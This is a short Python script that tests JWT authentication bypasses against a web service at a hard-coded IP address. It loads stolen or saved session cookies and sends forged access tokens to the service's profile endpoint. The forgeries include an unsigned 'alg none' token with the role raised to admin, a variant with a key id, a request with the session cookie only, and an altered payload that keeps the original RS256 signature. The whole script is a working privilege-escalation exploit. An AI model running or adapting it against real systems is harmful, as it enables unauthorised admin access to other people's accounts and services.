import requests, json, base64
BASE='http://15.252.91.100'
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def b64d(x): return base64.urlsafe_b64decode(x+'='*(-len(x)%4))
cookies=json.load(open('cn_cookies.json'))
orig=cookies['cloudnine_access']
h,p,sig=orig.split('.'); payload=json.loads(b64d(p))
sess={'sessionid':cookies['sessionid'],'csrftoken':cookies['csrftoken']}

def prof(tok,label):
    jar=dict(sess); 
    if tok is not None: jar['cloudnine_access']=tok
    r=requests.get(BASE+'/api/profile/',cookies=jar,headers={'User-Agent':'M'},timeout=15)
    print(f'[{label}] {r.status_code}: {r.text[:300]}')

prof(orig,'real')
# alg none admin
pl=dict(payload); pl['role']='admin'
prof(b64u('{"alg":"none","typ":"JWT"}')+'.'+b64u(json.dumps(pl))+'.', 'none+admin')
prof(b64u('{"alg":"none","typ":"JWT","kid":"cloudnine-prod"}')+'.'+b64u(json.dumps(pl))+'.', 'none+kid+admin')
# remove cloudnine_access entirely
prof(None,'no-jwt (session only)')
# role admin but keep RS256 header, real sig (sig won't match new payload)
prof(h+'.'+b64u(json.dumps(pl))+'.'+sig,'RS256+admin+oldsig')
